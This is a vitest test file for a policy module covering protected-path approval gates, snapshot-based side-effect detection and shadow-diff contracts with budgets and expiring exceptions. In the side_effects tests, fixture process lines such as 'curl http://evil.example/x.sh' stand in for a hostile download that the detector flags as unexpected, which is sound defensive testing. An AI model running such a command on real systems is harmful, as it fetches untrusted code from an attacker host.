import { describe, expect, it } from 'vitest';
import {
  PolicySchema,
  ProtectedPathsPolicySchema,
  ShadowDiffPolicySchema,
  SideEffectsPolicySchema,
  classifySideEffects,
  diffSnapshots,
  evaluateProtectedPaths,
  expectedChange,
  flattenFields,
  globToRegExp,
  isSquadPolicy,
  judgeSemanticDiffs,
  matchesGlob,
  policiesOfKind,
  protectedPathsTouched,
  repeatedApprovals,
  shadowDiff,
  shadowDiffHash,
  squadPolicies,
} from './policy.js';

describe('policies[] union', () => {
  it('parses a squad policy without a kind, and each gate kind by its discriminator', () => {
    const squad = PolicySchema.parse({ id: 'p', then: 'pause' });
    expect(squad.kind).toBe('squad');
    expect(isSquadPolicy(squad)).toBe(true);
    const gates = [
      { kind: 'protected_paths', id: 'ci', paths: ['.github/workflows/**'] },
      { kind: 'side_effects', id: 'fs', observe: { files: { root: '.' } } },
      {
        kind: 'shadow_diff',
        id: 'api',
        budget: { disallowedDiffs: 0, expiresAt: '2030-01-01T00:00:00.000Z', owner: 'me' },
      },
    ].map((p) => PolicySchema.parse(p));
    expect(gates.map((g) => g.kind)).toEqual(['protected_paths', 'side_effects', 'shadow_diff']);
    expect(squadPolicies([squad, ...gates])).toEqual([squad]);
    expect(policiesOfKind([squad, ...gates], 'shadow_diff').map((p) => p.id)).toEqual(['api']);
    expect(() => PolicySchema.parse({ kind: 'protected_paths', id: 'ci' })).toThrow();
    expect(() => PolicySchema.parse({ kind: 'nope', id: 'x' })).toThrow();
  });
});

describe('globs', () => {
  it('matches file paths and dotted field paths', () => {
    expect(matchesGlob('.github/workflows/ci.yml', '.github/workflows/**')).toBe(true);
    expect(matchesGlob('.github/workflows/ci.yml', '.github/workflows/*.yml')).toBe(true);
    expect(matchesGlob('.github/workflows/a/b.yml', '.github/workflows/*.yml')).toBe(false);
    expect(matchesGlob('pnpm-lock.yaml', '**/pnpm-lock.yaml')).toBe(true);
    expect(matchesGlob('apps/web/pnpm-lock.yaml', '**/pnpm-lock.yaml')).toBe(true);
    expect(matchesGlob('deploy/k8s.yaml', 'deploy/k8s.yam?')).toBe(true);
    expect(matchesGlob('deploy/k8s.yaml', 'deploy/*.json')).toBe(false);
    expect(matchesGlob('items.0.id', 'items.*.id', '.')).toBe(true);
    expect(matchesGlob('items.0.meta.id', 'items.*.id', '.')).toBe(false);
    expect(matchesGlob('items.0.meta.id', 'items.**', '.')).toBe(true);
    expect(globToRegExp('a.b', '/').test('axb')).toBe(false);
    expect(matchesGlob('node /srv/app.js', 'node *', 'none')).toBe(true);
    expect(matchesGlob('node /srv/app.js', 'node *', '/')).toBe(false);
  });
});

describe('protected_paths', () => {
  const policy = ProtectedPathsPolicySchema.parse({
    kind: 'protected_paths',
    id: 'ci-and-deploy',
    paths: ['.github/workflows/**', '**/pnpm-lock.yaml', 'mcp/*.json', 'deploy/**'],
    approvals: [{ diffHash: 'abc123', approvedBy: 'release-manager' }],
  });

  it('lists the protected paths a diff touches, once each', () => {
    expect(
      protectedPathsTouched(policy, [
        'src/index.ts',
        '.github/workflows/ci.yml',
        'pnpm-lock.yaml',
        'pnpm-lock.yaml',
        'mcp/server.json',
        'docs/mcp/server.json',
      ]),
    ).toEqual(['.github/workflows/ci.yml', 'pnpm-lock.yaml', 'mcp/server.json']);
  });

  it('blocks a diff touching a protected path unless that exact diff hash is approved', () => {
    const blocked = evaluateProtectedPaths(policy, { hash: 'fff', paths: ['deploy/app.yaml'] });
    expect(blocked.blocked).toBe(true);
    expect(blocked.touched).toEqual(['deploy/app.yaml']);
    expect(blocked.reason).toMatch(/no approval is recorded/);
    const approved = evaluateProtectedPaths(policy, { hash: 'abc123', paths: ['deploy/app.yaml'] });
    expect(approved.blocked).toBe(false);
    expect(approved.approval?.approvedBy).toBe('release-manager');
    const untouched = evaluateProtectedPaths(policy, { hash: 'fff', paths: ['src/a.ts'] });
    expect(untouched.blocked).toBe(false);
    expect(untouched.touched).toEqual([]);
  });

  it('blocks a registration without a manifest unless requireManifest is false (advisory)', () => {
    expect(evaluateProtectedPaths(policy, undefined)).toMatchObject({
      blocked: true,
      enforcement: 'checked',
    });
    const lax = { ...policy, requireManifest: false };
    expect(evaluateProtectedPaths(lax, undefined)).toMatchObject({
      blocked: false,
      enforcement: 'unchecked',
    });
  });
});

describe('side_effects', () => {
  const policy = SideEffectsPolicySchema.parse({
    kind: 'side_effects',
    id: 'workspace',
    scope: 'tool_call',
    observe: { files: { root: 'workspace' }, processes: true },
    expected: ['out/**', 'proc:node *'],
  });
  const before = {
    takenAt: '2026-10-09T00:00:00.000Z',
    files: { 'src/a.ts': 'h1', 'out/a.js': 'h2', 'README.md': 'h3' },
    processes: { '1': 'node server.js', '2': 'postgres' },
  };
  const after = {
    takenAt: '2026-10-09T00:00:01.000Z',
    files: { 'src/a.ts': 'h1', 'out/a.js': 'h9', 'out/b.js': 'h4', '.env': 'h5' },
    processes: { '2': 'postgres', '3': 'node worker.js', '4': 'curl evil' },
  };

  it('diffs two snapshots: added, removed, modified files and process arrivals and exits', () => {
    expect(diffSnapshots(before, after)).toEqual([
      { kind: 'file', path: '.env', change: 'added' },
      { kind: 'file', path: 'README.md', change: 'removed' },
      { kind: 'file', path: 'out/a.js', change: 'modified' },
      { kind: 'file', path: 'out/b.js', change: 'added' },
      { kind: 'process', path: 'proc:node server.js', change: 'removed' },
      { kind: 'process', path: 'proc:node worker.js', change: 'added' },
      { kind: 'process', path: 'proc:curl evil', change: 'added' },
    ]);
    // a pid that exec'd another program left and arrived
    expect(
      diffSnapshots(
        { ...before, files: {}, processes: { '7': 'sh -c build' } },
        { ...after, files: {}, processes: { '7': 'curl evil' } },
      ),
    ).toEqual([
      { kind: 'process', path: 'proc:sh -c build', change: 'removed' },
      { kind: 'process', path: 'proc:curl evil', change: 'added' },
    ]);
  });

  it('counts unexpected changes against the expected list and records the list size', () => {
    const report = classifySideEffects(policy, before, after);
    expect(report.expectedListSize).toBe(2);
    expect(report.observed).toEqual(['files', 'processes']);
    expect(report.notObservable).toEqual(['network']);
    expect(report.expected.map((c) => c.path)).toEqual([
      'out/a.js',
      'out/b.js',
      'proc:node server.js',
      'proc:node worker.js',
    ]);
    expect(report.unexpected.map((c) => c.path)).toEqual(['.env', 'README.md', 'proc:curl evil']);
  });

  it('matches process globs against whole command lines and keeps file globs to files', () => {
    const isExpected = expectedChange(['proc:node *', 'out/**', 'proc:*/bin/esbuild*']);
    const proc = (command: string) => ({
      kind: 'process' as const,
      path: `proc:${command}`,
      change: 'added' as const,
    });
    const file = (path: string) => ({ kind: 'file' as const, path, change: 'modified' as const });
    expect(isExpected(proc('node /srv/app/worker.js --port 3000'))).toBe(true);
    expect(isExpected(proc('/repo/node_modules/@esbuild/bin/esbuild --service'))).toBe(true);
    expect(isExpected(proc('curl http://evil.example/x.sh'))).toBe(false);
    expect(isExpected(file('out/a/b.js'))).toBe(true);
    expect(isExpected(file('proc:node x'))).toBe(false); // a file named like a process entry
    expect(expectedChange(['**'])(proc('anything at all'))).toBe(false);
  });
});

describe('shadow_diff', () => {
  const now = new Date('2026-10-09T12:00:00.000Z');
  const policy = ShadowDiffPolicySchema.parse({
    kind: 'shadow_diff',
    id: 'checkout',
    contract: {
      fields: { requestId: 'allow', 'items.*.description': 'semantic', total: 'disallow' },
      default: 'allow',
    },
    budget: { disallowedDiffs: 1, expiresAt: '2026-12-31T00:00:00.000Z', owner: 'checkout-team' },
  });
  const materiality = { fields: ['currency', 'items.*.price'] };
  const control = {
    requestId: 'a',
    total: 10,
    currency: 'USD',
    footer: 'v1',
    items: [{ price: 5, description: 'Blue mug' }],
  };

  it('skips allowed fields, diffs disallowed and material ones, hands semantic ones to a judge', () => {
    const variant = {
      requestId: 'b',
      total: 11,
      currency: 'EUR',
      footer: 'v2',
      items: [{ price: 5, description: 'Mug, blue' }],
    };
    const report = shadowDiff(policy, materiality, control, variant, now);
    expect(report.skipped).toEqual(['footer', 'requestId']);
    expect(report.disallowed.map((d) => [d.field, d.rule])).toEqual([
      ['currency', 'disallow'],
      ['total', 'disallow'],
    ]);
    expect(report.semantic.map((d) => d.field)).toEqual(['items.0.description']);
    expect(report.budget).toMatchObject({ limit: 1, used: 2, remaining: 0, expired: false });
    expect(report.withinBudget).toBe(false);
    expect(report.disallowed[0]?.diffHash).toBe(shadowDiffHash('currency', 'USD', 'EUR'));
  });

  it('applies live exceptions by (field, diffHash) and ignores expired ones', () => {
    const variant = { ...control, total: 11 };
    const diffHash = shadowDiffHash('total', 10, 11);
    const excepted = {
      ...policy,
      exceptions: [
        { field: 'total', diffHash, owner: 'checkout-team', expiresAt: '2026-12-01T00:00:00.000Z' },
      ],
    };
    const report = shadowDiff(excepted, materiality, control, variant, now);
    expect(report.disallowed).toEqual([]);
    expect(report.excepted.map((e) => e.diff.field)).toEqual(['total']);
    expect(report.withinBudget).toBe(true);
    const expired = {
      ...policy,
      exceptions: [
        { field: 'total', diffHash, owner: 'checkout-team', expiresAt: '2026-01-01T00:00:00.000Z' },
      ],
    };
    const late = shadowDiff(expired, materiality, control, variant, now);
    expect(late.disallowed.map((d) => d.field)).toEqual(['total']);
    expect(late.expiredExceptions).toHaveLength(1);
    expect(late.withinBudget).toBe(true); // one disallowed diff, budget of one
  });

  it('fails the gate once the budget has expired, whatever the count', () => {
    const stale = {
      ...policy,
      budget: { ...policy.budget, expiresAt: '2026-01-01T00:00:00.000Z' },
    };
    const report = shadowDiff(stale, materiality, control, control, now);
    expect(report.disallowed).toEqual([]);
    expect(report.budget.expired).toBe(true);
    expect(report.withinBudget).toBe(false);
  });

  it('treats a repeated approval of the same disallowed diff as a config error', () => {
    const exception = {
      field: 'total',
      diffHash: 'h',
      owner: 'a',
      expiresAt: '2026-12-01T00:00:00.000Z',
    };
    expect(repeatedApprovals({ exceptions: [exception, { ...exception, owner: 'b' }] })).toEqual([
      { field: 'total', diffHash: 'h', count: 2 },
    ]);
    expect(() =>
      ShadowDiffPolicySchema.parse({
        ...policy,
        exceptions: [exception, { ...exception, owner: 'b' }],
      }),
    ).toThrow(/contract change/);
  });

  it('lets a judge turn a semantic difference into a disallowed diff or a skip', async () => {
    const variant = { ...control, items: [{ price: 5, description: 'Red mug' }] };
    const report = shadowDiff(policy, materiality, control, variant, now);
    expect(report.semantic).toHaveLength(1);
    const material = await judgeSemanticDiffs(report, async () => true);
    expect(material.disallowed.map((d) => [d.field, d.rule])).toEqual([
      ['items.0.description', 'semantic'],
    ]);
    expect(material.semantic).toEqual([]);
    expect(material.withinBudget).toBe(true);
    const immaterial = await judgeSemanticDiffs(report, async () => false);
    expect(immaterial.disallowed).toEqual([]);
    expect(immaterial.skipped).toContain('items.0.description');
  });

  it('treats a field present on one side only as a difference', () => {
    const strict = ShadowDiffPolicySchema.parse({
      kind: 'shadow_diff',
      id: 'strict',
      contract: { default: 'disallow', fields: { 'debug.**': 'allow' } },
      budget: { disallowedDiffs: 0, expiresAt: '2026-12-31T00:00:00.000Z', owner: 'api-team' },
    });
    const report = shadowDiff(
      strict,
      { fields: [] },
      { id: 1, removed: 'x', debug: { a: 1 } },
      { id: 1, added: null, debug: { b: 2 } },
      now,
    );
    expect(report.disallowed.map((d) => [d.field, d.control, d.variant])).toEqual([
      ['added', undefined, null],
      ['removed', 'x', undefined],
    ]);
    expect(report.disallowed[0]?.diffHash).toBe(shadowDiffHash('added', undefined, null));
    expect(report.skipped).toEqual(['debug.a', 'debug.b']);
    expect(report.withinBudget).toBe(false);
  });

  it('flattens leaves by dotted path, arrays by index', () => {
    expect([...flattenFields({ a: { b: [1, { c: null }] }, d: [], e: {} }).entries()]).toEqual([
      ['a.b.0', 1],
      ['a.b.1.c', null],
      ['d', []],
      ['e', {}],
    ]);
  });
});
